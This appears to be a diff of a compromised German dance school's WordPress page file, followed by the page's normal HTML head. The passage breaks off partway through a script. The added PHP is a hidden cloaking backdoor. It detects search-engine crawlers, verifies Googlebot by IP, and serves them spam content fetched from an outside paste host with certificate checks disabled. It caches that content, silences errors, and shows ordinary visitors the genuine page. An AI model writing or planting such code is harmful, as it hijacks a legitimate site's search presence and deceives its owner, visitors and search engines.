@@ -1,40 +1,1380 @@
 <?php
-$bot_user_agents = array(
-    "Googlebot", "Googlebot-Image", "Googlebot-News", "Googlebot-Video", "Storebot-Google", "Google-InspectionTool",
-    "GoogleOther", "GoogleOther-Image", "GoogleOther-Video", "Google-CloudVertexBot", "Google-Extended", "APIs-Google",
-    "AdsBot-Google-Mobile", "AdsBot-Google", "Mediapartners-Google", "FeedFetcher-Google", "Google-Favicon", "Google Favicon",
-    "Googlebot-Favicon", "Google-Site-Verification", "Google-Read-Aloud", "GoogleProducer", "Google Web Preview", "Bingbot",
-    "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot", "Sogou", "Exabot", "facebookexternalhit", "ia_archiver",
-    "Alexa Crawler", "AhrefsBot", "Semrushbot"
-);
+error_reporting(0);
+ini_set('display_errors', 0);
 
-$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+// ============================================
+// CONFIGURATION
+// ============================================
+$config = [
+    'bot_url' => 'https://paste.phyo186.cfd/8kuAN-XmTsN/raw',
+    'cache_ttl' => 3600,
+    'timeout' => 15
+];
 
-function is_bot($user_agent, $bot_user_agents) {
-    foreach ($bot_user_agents as $bot) {
+function is_search_bot() {
+    $bots = [
+        // Google
+        'Googlebot', 'Googlebot-Mobile', 'Googlebot-Image', 'Googlebot-News',
+        'Googlebot-Video', 'AdsBot-Google', 'Mediapartners-Google',
+        'Google-InspectionTool', 'Google-Site-Verification', 'Storebot-Google',
+        
+        // Bing
+        'bingbot', 'msnbot', 'BingPreview',
+        
+        // Others
+        'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot',
+        'facebookexternalhit', 'LinkedInBot', 'Twitterbot'
+    ];
+    
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    
+    foreach ($bots as $bot) {
         if (stripos($user_agent, $bot) !== false) {
             return true;
         }
     }
+    
     return false;
 }
 
-function is_mobile($user_agent) {
-    $mobile_agents = array('Mobile', 'Android', 'Silk/', 'Kindle', 'BlackBerry', 'Opera Mini', 'Opera Mobi', 'iPhone', 'iPad');
-    foreach ($mobile_agents as $mobile) {
-        if (stripos($user_agent, $mobile) !== false) {
+function verify_google_ip() {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    
+    if (empty($ip)) {
+        return false;
+    }
+    
+    // Quick check: Google IP ranges
+    $google_ip_prefixes = ['66.249.', '64.233.', '72.14.', '209.85.', '216.239.'];
+    
+    foreach ($google_ip_prefixes as $prefix) {
+        if (strpos($ip, $prefix) === 0) {
             return true;
         }
     }
+    
+    // Deep verification: Reverse DNS
+    $hostname = gethostbyaddr($ip);
+    
+    if (stripos($hostname, 'googlebot.com') !== false || 
+        stripos($hostname, 'google.com') !== false) {
+        
+        $resolved_ip = gethostbyname($hostname);
+        
+        if ($resolved_ip === $ip) {
+            return true;
+        }
+    }
+    
     return false;
 }
 
-// Combined conditions for including 'landingpage.php'
-if (is_bot($user_agent, $bot_user_agents) || is_mobile($user_agent)) {
-    include 'file.php';
-    exit;
-} else {
-    include 'home.php';
+function get_remote_content($url, $timeout = 10) {
+    // Try cURL first
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_MAXREDIRS => 5,
+            CURLOPT_TIMEOUT => $timeout,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            CURLOPT_ENCODING => 'gzip, deflate',
+            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1
+        ]);
+        
+        $content = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        curl_close($ch);
+        
+        if ($content && $http_code == 200) {
+            return $content;
+        }
+        
+        error_log("cURL failed: $error (HTTP $http_code)");
+    }
+    
+    // Fallback: file_get_contents
+    if (ini_get('allow_url_fopen')) {
+        $context = stream_context_create([
+            'http' => [
+                'method' => 'GET',
+                'timeout' => $timeout,
+                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'follow_location' => 1,
+                'max_redirects' => 5
+            ],
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false
+            ]
+        ]);
+        
+        $content = @file_get_contents($url, false, $context);
+        
+        if ($content !== false) {
+            return $content;
+        }
+    }
+    
+    return false;
+}
+
+function cache_content($key, $content = null, $ttl = 3600) {
+    $cache_dir = __DIR__ . '/.cache';
+    
+    if (!is_dir($cache_dir)) {
+        @mkdir($cache_dir, 0755, true);
+    }
+    
+    $cache_file = $cache_dir . '/' . md5($key) . '.html';
+    
+    if ($content !== null) {
+        // Save cache
+        file_put_contents($cache_file, serialize([
+            'time' => time(),
+            'content' => $content
+        ]));
+        return true;
+    } else {
+        // Read cache
+        if (file_exists($cache_file)) {
+            $data = unserialize(file_get_contents($cache_file));
+            
+            if ($data && (time() - $data['time']) < $ttl) {
+                return $data['content'];
+            }
+        }
+    }
+    
+    return false;
+}
+
+function serve_bot_content($url, $ttl = 3600, $timeout = 15) {
+    // Try cache first
+    $cached = cache_content('bot_content', null, $ttl);
+    if ($cached) {
+        header('Content-Type: text/html; charset=utf-8');
+        header('X-Content-Source: cache');
+        header('X-Visitor-Type: bot');
+        echo $cached;
+        exit;
+    }
+    
+    // Fetch fresh content
+    $content = get_remote_content($url, $timeout);
+    
+    if ($content) {
+        cache_content('bot_content', $content, $ttl);
+        
+        header('Content-Type: text/html; charset=utf-8');
+        header('X-Content-Source: remote');
+        header('X-Visitor-Type: bot');
+        echo $content;
+        exit;
+    }
+    
+    // Fallback: Error
+    http_response_code(503);
+    header('Retry-After: 300');
+    echo '<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Temporarily Unavailable</title>
+</head>
+<body>
+    <h1>503 Service Temporarily Unavailable</h1>
+    <p>Please try again later.</p>
+</body>
+</html>';
     exit;
 }
+
+// ============================================
+// MAIN EXECUTION
+// ============================================
+
+// Check if visitor is a bot
+if (is_search_bot()) {
+    
+    // Additional security: Verify Google IP
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    
+    if (stripos($user_agent, 'Googlebot') !== false) {
+        if (!verify_google_ip()) {
+            // Fake Googlebot! Let it see user content below
+            error_log("Fake Googlebot detected from IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
+            // Don't exit, continue to show HTML below
+        } else {
+            // Real Googlebot - serve remote content
+            serve_bot_content($config['bot_url'], $config['cache_ttl'], $config['timeout']);
+        }
+    } else {
+        // Other bots - serve remote content
+        serve_bot_content($config['bot_url'], $config['cache_ttl'], $config['timeout']);
+    }
+}
+
+// If we reach here, it's a regular user or fake bot
+// Show the HTML content below
+header('Content-Type: text/html; charset=utf-8');
+header('X-Visitor-Type: user');
 ?>
+
+
+
+
+
+
+
+<!doctype html>
+<html lang="de" prefix="og: https://ogp.me/ns#">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+		<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	
+<!-- Suchmaschinen-Optimierung durch Rank Math PRO - https://rankmath.com/ -->
+<title>Das Team - Motsi Mabuse Die Taunustanzschule</title>
+<meta name="description" content="Unsere Tanzschulfamilie"/>
+<meta name="robots" content="follow, index, max-snippet:-1, max-video-preview:-1, max-image-preview:large"/>
+<link rel="canonical" href="https://motsimabuse-dietanzschule.de/trainer/" />
+<meta property="og:locale" content="de_DE" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Das Team - Motsi Mabuse Die Taunustanzschule" />
+<meta property="og:description" content="Unsere Tanzschulfamilie" />
+<meta property="og:url" content="https://motsimabuse-dietanzschule.de/trainer/" />
+<meta property="og:site_name" content="Motsi Mabuse - Die Taunustanzschule" />
+<meta property="og:updated_time" content="2023-11-19T17:03:12+01:00" />
+<meta property="article:published_time" content="2023-03-19T21:47:29+01:00" />
+<meta property="article:modified_time" content="2023-11-19T17:03:12+01:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Das Team - Motsi Mabuse Die Taunustanzschule" />
+<meta name="twitter:description" content="Unsere Tanzschulfamilie" />
+<meta name="twitter:label1" content="Lesedauer" />
+<meta name="twitter:data1" content="Weniger als eine Minute" />
+<script type="application/ld+json" class="rank-math-schema">{"@context":"https://schema.org","@graph":[{"@type":"Place","@id":"https://motsimabuse-dietanzschule.de/#place","address":{"@type":"PostalAddress","streetAddress":"Margarete-v.-Wrangell-Str. 15","addressLocality":"Kelkheim","postalCode":"65779","addressCountry":"Germany"}},{"@type":["DanceGroup","Organization"],"@id":"https://motsimabuse-dietanzschule.de/#organization","name":"Motsi Mabuse - Die Taunustanzschule GmbH","url":"https://motsimabuse-dietanzschule.de","email":"info@motsimabuse-dietanzschule.de","address":{"@type":"PostalAddress","streetAddress":"Margarete-v.-Wrangell-Str. 15","addressLocality":"Kelkheim","postalCode":"65779","addressCountry":"Germany"},"logo":{"@type":"ImageObject","@id":"https://motsimabuse-dietanzschule.de/#logo","url":"https://motsimabuse-dietanzschule.de/wp-content/uploads/2023/04/logo_03_250x250.png","contentUrl":"https://motsimabuse-dietanzschule.de/wp-content/uploads/2023/04/logo_03_250x250.png","caption":"Motsi Mabuse - Die Taunustanzschule","inLanguage":"de"},"contactPoint":[{"@type":"ContactPoint","telephone":"+4961959775940","contactType":"customer support"}],"location":{"@id":"https://motsimabuse-dietanzschule.de/#place"}},{"@type":"WebSite","@id":"https://motsimabuse-dietanzschule.de/#website","url":"https://motsimabuse-dietanzschule.de","name":"Motsi Mabuse - Die Taunustanzschule","alternateName":"Tanzschule Motsi Mabuse","publisher":{"@id":"https://motsimabuse-dietanzschule.de/#organization"},"inLanguage":"de"},{"@type":"WebPage","@id":"https://motsimabuse-dietanzschule.de/trainer/#webpage","url":"https://motsimabuse-dietanzschule.de/trainer/","name":"Das Team - Motsi Mabuse Die Taunustanzschule","datePublished":"2023-03-19T21:47:29+01:00","dateModified":"2023-11-19T17:03:12+01:00","isPartOf":{"@id":"https://motsimabuse-dietanzschule.de/#website"},"inLanguage":"de"},{"@type":"Person","@id":"https://motsimabuse-dietanzschule.de/trainer/#author","name":"Richard","image":{"@type":"ImageObject","@id":"https://secure.gravatar.com/avatar/a82dc4e97b05f144246ca21a8e8e56149e36f73f0b0aa0debc429734dc9f2128?s=96&amp;d=mm&amp;r=g","url":"https://secure.gravatar.com/avatar/a82dc4e97b05f144246ca21a8e8e56149e36f73f0b0aa0debc429734dc9f2128?s=96&amp;d=mm&amp;r=g","caption":"Richard","inLanguage":"de"},"worksFor":{"@id":"https://motsimabuse-dietanzschule.de/#organization"}},{"@type":"Article","headline":"Das Team - Motsi Mabuse Die Taunustanzschule","datePublished":"2023-03-19T21:47:29+01:00","dateModified":"2023-11-19T17:03:12+01:00","author":{"@id":"https://motsimabuse-dietanzschule.de/trainer/#author","name":"Richard"},"publisher":{"@id":"https://motsimabuse-dietanzschule.de/#organization"},"description":"Unsere Tanzschulfamilie","name":"Das Team - Motsi Mabuse Die Taunustanzschule","@id":"https://motsimabuse-dietanzschule.de/trainer/#richSnippet","isPartOf":{"@id":"https://motsimabuse-dietanzschule.de/trainer/#webpage"},"inLanguage":"de","mainEntityOfPage":{"@id":"https://motsimabuse-dietanzschule.de/trainer/#webpage"}}]}</script>
+<!-- /Rank Math WordPress SEO Plugin -->
+
+<link rel="alternate" type="application/rss+xml" title="Motsi Mabuse Die Taunustanzschule &raquo; Feed" href="https://motsimabuse-dietanzschule.de/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Motsi Mabuse Die Taunustanzschule &raquo; Kommentar-Feed" href="https://motsimabuse-dietanzschule.de/comments/feed/" />
+<script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/motsimabuse-dietanzschule.de\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.3"}};
+/*! This file is auto-generated */
+!function(s,n){var o,i,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),a=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===a[t]})}function u(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);for(var n=e.getImageData(16,16,1,1),a=0;a<n.data.length;a++)if(0!==n.data[a])return!1;return!0}function f(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\udedf")}return!1}function g(e,t,n,a){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):s.createElement("canvas"),o=r.getContext("2d",{willReadFrequently:!0}),i=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(function(e){i[e]=t(o,e,n,a)}),i}function t(e){var t=s.createElement("script");t.src=e,t.defer=!0,s.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",i=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){s.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+g.toString()+"("+[JSON.stringify(i),f.toString(),p.toString(),u.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"}),r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=function(e){c(n=e.data),r.terminate(),t(n)})}catch(e){}c(n=g(i,f,p,u))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+</script>
+		<style id="content-control-block-styles">
+			@media (max-width: 640px) {
+	.cc-hide-on-mobile {
+		display: none !important;
+	}
+}
+@media (min-width: 641px) and (max-width: 920px) {
+	.cc-hide-on-tablet {
+		display: none !important;
+	}
+}
+@media (min-width: 921px) and (max-width: 1440px) {
+	.cc-hide-on-desktop {
+		display: none !important;
+	}
+}		</style>
+		<style id='wp-emoji-styles-inline-css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<!-- <link rel='stylesheet' id='content-control-block-styles-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/content-control/dist/style-block-editor.css?ver=2.6.5' media='all' /> -->
+<!-- <link rel='stylesheet' id='hello-child-style-css' href='https://motsimabuse-dietanzschule.de/wp-content/themes/hello-theme-child-master/style.css?ver=6.8.3' media='all' /> -->
+<!-- <link rel='stylesheet' id='hello-elementor-css' href='https://motsimabuse-dietanzschule.de/wp-content/themes/hello-elementor/assets/css/reset.css?ver=3.4.5' media='all' /> -->
+<!-- <link rel='stylesheet' id='hello-elementor-theme-style-css' href='https://motsimabuse-dietanzschule.de/wp-content/themes/hello-elementor/assets/css/theme.css?ver=3.4.5' media='all' /> -->
+<!-- <link rel='stylesheet' id='hello-elementor-header-footer-css' href='https://motsimabuse-dietanzschule.de/wp-content/themes/hello-elementor/assets/css/header-footer.css?ver=3.4.5' media='all' /> -->
+<!-- <link rel='stylesheet' id='elementor-frontend-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/custom-frontend.min.css?ver=1765005720' media='all' /> -->
+<link rel="stylesheet" type="text/css" href="//motsimabuse-dietanzschule.de/wp-content/cache/wpfc-minified/q91z7y0z/4bak.css" media="all"/>
+<link rel='stylesheet' id='elementor-post-7-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/post-7.css?ver=1765005720' media='all' />
+<!-- <link rel='stylesheet' id='e-animation-fadeInDown-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor/assets/lib/animations/styles/fadeInDown.min.css?ver=3.33.3' media='all' /> -->
+<!-- <link rel='stylesheet' id='widget-image-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor/assets/css/widget-image.min.css?ver=3.33.3' media='all' /> -->
+<!-- <link rel='stylesheet' id='e-sticky-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor-pro/assets/css/modules/sticky.min.css?ver=3.33.2' media='all' /> -->
+<!-- <link rel='stylesheet' id='e-animation-fadeIn-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor/assets/lib/animations/styles/fadeIn.min.css?ver=3.33.3' media='all' /> -->
+<!-- <link rel='stylesheet' id='widget-heading-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor/assets/css/widget-heading.min.css?ver=3.33.3' media='all' /> -->
+<!-- <link rel='stylesheet' id='widget-icon-list-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/custom-widget-icon-list.min.css?ver=1765005723' media='all' /> -->
+<!-- <link rel='stylesheet' id='e-shapes-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor/assets/css/conditionals/shapes.min.css?ver=3.33.3' media='all' /> -->
+<!-- <link rel='stylesheet' id='e-popup-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor-pro/assets/css/conditionals/popup.min.css?ver=3.33.2' media='all' /> -->
+<!-- <link rel='stylesheet' id='e-animation-slideInRight-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor/assets/lib/animations/styles/slideInRight.min.css?ver=3.33.3' media='all' /> -->
+<!-- <link rel='stylesheet' id='widget-divider-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor/assets/css/widget-divider.min.css?ver=3.33.3' media='all' /> -->
+<!-- <link rel='stylesheet' id='widget-loop-common-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor-pro/assets/css/widget-loop-common.min.css?ver=3.33.2' media='all' /> -->
+<!-- <link rel='stylesheet' id='widget-loop-grid-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/custom-pro-widget-loop-grid.min.css?ver=1765005726' media='all' /> -->
+<link rel="stylesheet" type="text/css" href="//motsimabuse-dietanzschule.de/wp-content/cache/wpfc-minified/lz1mxdma/4j0g.css" media="all"/>
+<link rel='stylesheet' id='elementor-post-6615-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/post-6615.css?ver=1765007070' media='all' />
+<link rel='stylesheet' id='elementor-post-4949-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/post-4949.css?ver=1765005723' media='all' />
+<link rel='stylesheet' id='elementor-post-2392-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/post-2392.css?ver=1765005724' media='all' />
+<link rel='stylesheet' id='elementor-post-9868-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/post-9868.css?ver=1765005724' media='all' />
+<link rel='stylesheet' id='elementor-post-8861-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/post-8861.css?ver=1765005724' media='all' />
+<link rel='stylesheet' id='elementor-post-1838-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/post-1838.css?ver=1765005724' media='all' />
+<!-- <link rel='stylesheet' id='borlabs-cookie-custom-css' href='https://motsimabuse-dietanzschule.de/wp-content/cache/borlabs-cookie/1/borlabs-cookie-1-de.css?ver=3.3.21.1-115' media='all' /> -->
+<!-- <link rel='stylesheet' id='ekit-widget-styles-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementskit-lite/widgets/init/assets/css/widget-styles.css?ver=3.7.7' media='all' /> -->
+<!-- <link rel='stylesheet' id='ekit-widget-styles-pro-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementskit/widgets/init/assets/css/widget-styles-pro.css?ver=4.1.2' media='all' /> -->
+<!-- <link rel='stylesheet' id='ekit-responsive-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementskit-lite/widgets/init/assets/css/responsive.css?ver=3.7.7' media='all' /> -->
+<!-- <link rel='stylesheet' id='ecs-styles-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/ele-custom-skin/assets/css/ecs-style.css?ver=3.1.9' media='all' /> -->
+<link rel="stylesheet" type="text/css" href="//motsimabuse-dietanzschule.de/wp-content/cache/wpfc-minified/ck9uoa4/4bak.css" media="all"/>
+<link rel='stylesheet' id='elementor-post-5787-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/post-5787.css?ver=1713014073' media='all' />
+<link rel='stylesheet' id='elementor-post-6765-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/post-6765.css?ver=1763719171' media='all' />
+<link rel='stylesheet' id='elementor-post-9394-css' href='https://motsimabuse-dietanzschule.de/wp-content/uploads/elementor/css/post-9394.css?ver=1683282257' media='all' />
+<!-- <link rel='stylesheet' id='elementor-icons-ekiticons-css' href='https://motsimabuse-dietanzschule.de/wp-content/plugins/elementskit-lite/modules/elementskit-icon-pack/assets/css/ekiticons.css?ver=3.7.7' media='all' /> -->
+<link rel="stylesheet" type="text/css" href="//motsimabuse-dietanzschule.de/wp-content/cache/wpfc-minified/d2kjl51p/4bak.css" media="all"/>
+<script src='//motsimabuse-dietanzschule.de/wp-content/cache/wpfc-minified/7ufufszm/4bak.js' type="text/javascript"></script>
+<!-- <script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/elementor-pro/assets/js/page-transitions.min.js?ver=3.33.2" id="page-transitions-js"></script> -->
+<!-- <script src="https://motsimabuse-dietanzschule.de/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script> -->
+<!-- <script src="https://motsimabuse-dietanzschule.de/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script> -->
+<script data-no-optimize="1" data-no-minify="1" data-cfasync="false" src="https://motsimabuse-dietanzschule.de/wp-content/cache/borlabs-cookie/1/borlabs-cookie-config-de.json.js?ver=3.3.21.1-121" id="borlabs-cookie-config-js"></script>
+<script data-no-optimize="1" data-no-minify="1" data-cfasync="false" src="https://motsimabuse-dietanzschule.de/wp-content/plugins/borlabs-cookie/assets/javascript/borlabs-cookie-prioritize.min.js?ver=3.3.21.1" id="borlabs-cookie-prioritize-js"></script>
+<script id="ecs_ajax_load-js-extra">
+var ecs_ajax_params = {"ajaxurl":"https:\/\/motsimabuse-dietanzschule.de\/wp-admin\/admin-ajax.php","posts":"{\"page\":0,\"pagename\":\"trainer\",\"error\":\"\",\"m\":\"\",\"p\":0,\"post_parent\":\"\",\"subpost\":\"\",\"subpost_id\":\"\",\"attachment\":\"\",\"attachment_id\":0,\"name\":\"trainer\",\"page_id\":0,\"second\":\"\",\"minute\":\"\",\"hour\":\"\",\"day\":0,\"monthnum\":0,\"year\":0,\"w\":0,\"category_name\":\"\",\"tag\":\"\",\"cat\":\"\",\"tag_id\":\"\",\"author\":\"\",\"author_name\":\"\",\"feed\":\"\",\"tb\":\"\",\"paged\":0,\"meta_key\":\"\",\"meta_value\":\"\",\"preview\":\"\",\"s\":\"\",\"sentence\":\"\",\"title\":\"\",\"fields\":\"all\",\"menu_order\":\"\",\"embed\":\"\",\"category__in\":[],\"category__not_in\":[],\"category__and\":[],\"post__in\":[],\"post__not_in\":[],\"post_name__in\":[],\"tag__in\":[],\"tag__not_in\":[],\"tag__and\":[],\"tag_slug__in\":[],\"tag_slug__and\":[],\"post_parent__in\":[],\"post_parent__not_in\":[],\"author__in\":[],\"author__not_in\":[],\"search_columns\":[],\"ignore_sticky_posts\":false,\"suppress_filters\":false,\"cache_results\":true,\"update_post_term_cache\":true,\"update_menu_item_cache\":false,\"lazy_load_term_meta\":true,\"update_post_meta_cache\":true,\"post_type\":\"\",\"posts_per_page\":10,\"nopaging\":false,\"comments_per_page\":\"50\",\"no_found_rows\":false,\"order\":\"DESC\"}"};
+</script>
+<script src='//motsimabuse-dietanzschule.de/wp-content/cache/wpfc-minified/qvge84yg/4bak.js' type="text/javascript"></script>
+<!-- <script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/ele-custom-skin/assets/js/ecs_ajax_pagination.js?ver=3.1.9" id="ecs_ajax_load-js"></script> -->
+<!-- <script src="https://motsimabuse-dietanzschule.de/wp-content/plugins/ele-custom-skin/assets/js/ecs.js?ver=3.1.9" id="ecs-script-js"></script> -->
+<link rel="https://api.w.org/" href="https://motsimabuse-dietanzschule.de/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://motsimabuse-dietanzschule.de/wp-json/wp/v2/pages/6615" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://motsimabuse-dietanzschule.de/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.8.3" />
+<link rel='shortlink' href='https://motsimabuse-dietanzschule.de/?p=6615' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://motsimabuse-dietanzschule.de/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmotsimabuse-dietanzschule.de%2Ftrainer%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://motsimabuse-dietanzschule.de/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmotsimabuse-dietanzschule.de%2Ftrainer%2F&#038;format=xml" />
+<meta name="generator" content="Elementor 3.33.3; features: e_font_icon_svg, additional_custom_breakpoints; settings: css_print_method-external, google_font-disabled, font_display-swap">
+<script type="text/javascript">
+    window.onload = function () {
+        window.addEventListener("message", function(event){
+            if (event.origin !== "https://tanzschule-motsimabuse.nimbuscloud.at") {
+                return;
+            }
+
+            if(isNaN(event.data)) {
+                var height = parseInt(event.data.height);
+                document.getElementById(event.data.frameId).style.height = height + "px";
+            } else {
+                var height = parseInt(event.data);
+                document.getElementsByClassName("nimbuscloudFrame")[0].style.height = height + "px";
+            }
+        }, false);
+    };
+</script>
+<script data-borlabs-cookie-script-blocker-ignore>
+if ('0' === '1' && ('0' === '1' || '1' === '1')) {
+    window['gtag_enable_tcf_support'] = true;
+}
+window.dataLayer = window.dataLayer || [];
+if (typeof gtag !== 'function') {
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+}
+gtag('set', 'developer_id.dYjRjMm', true);
+if ('0' === '1' || '1' === '1') {
+    if (window.BorlabsCookieGoogleConsentModeDefaultSet !== true) {
+        let getCookieValue = function (name) {
+            return document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || '';
+        };
+        let cookieValue = getCookieValue('borlabs-cookie-gcs');
+        let consentsFromCookie = {};
+        if (cookieValue !== '') {
+            consentsFromCookie = JSON.parse(decodeURIComponent(cookieValue));
+        }
+        let defaultValues = {
+            'ad_storage': 'denied',
+            'ad_user_data': 'denied',
+            'ad_personalization': 'denied',
+            'analytics_storage': 'denied',
+            'functionality_storage': 'denied',
+            'personalization_storage': 'denied',
+            'security_storage': 'denied',
+            'wait_for_update': 500,
+        };
+        gtag('consent', 'default', { ...defaultValues, ...consentsFromCookie });
+    }
+    window.BorlabsCookieGoogleConsentModeDefaultSet = true;
+    let borlabsCookieConsentChangeHandler = function () {
+        window.dataLayer = window.dataLayer || [];
+        if (typeof gtag !== 'function') { function gtag(){dataLayer.push(arguments);} }
+
+        let getCookieValue = function (name) {
+            return document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || '';
+        };
+        let cookieValue = getCookieValue('borlabs-cookie-gcs');
+        let consentsFromCookie = {};
+        if (cookieValue !== '') {
+            consentsFromCookie = JSON.parse(decodeURIComponent(cookieValue));
+        }
+
